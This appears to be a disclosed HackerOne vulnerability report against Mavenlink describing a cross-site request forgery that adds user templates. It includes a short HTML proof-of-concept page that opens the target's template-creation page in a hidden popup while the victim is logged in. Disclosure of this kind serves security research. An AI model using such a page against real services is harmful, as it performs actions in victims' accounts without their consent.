# CSRF Add user templates

## Report Details
- **Report ID**: 301919
- **URL**: https://hackerone.com/reports/301919
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-01-03T09:04:03.740Z
- **Disclosed**: 2019-02-27T23:39:23.847Z

## Reporter
- **Username**: tolo7010
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mavenlink

## Vulnerability Information
Reproduction:
==========

- Log in to account
- Visit CSRF page below (note default 30 seconds timeout, can be adjusted according to the connection speed): 

```
<!doctype html>
<html>
<head>
</head> 
<body>
<script>
var a = window.open("https://app.mavenlink.com/project_templates#new", "csrf", "height=100,width=100"); 
var intervalID = setTimeout(function () { a.close();}, 30000); 
</script>
</body>
</html>
```

## Impact

CSRF Add user templates

## Attachments
No attachments
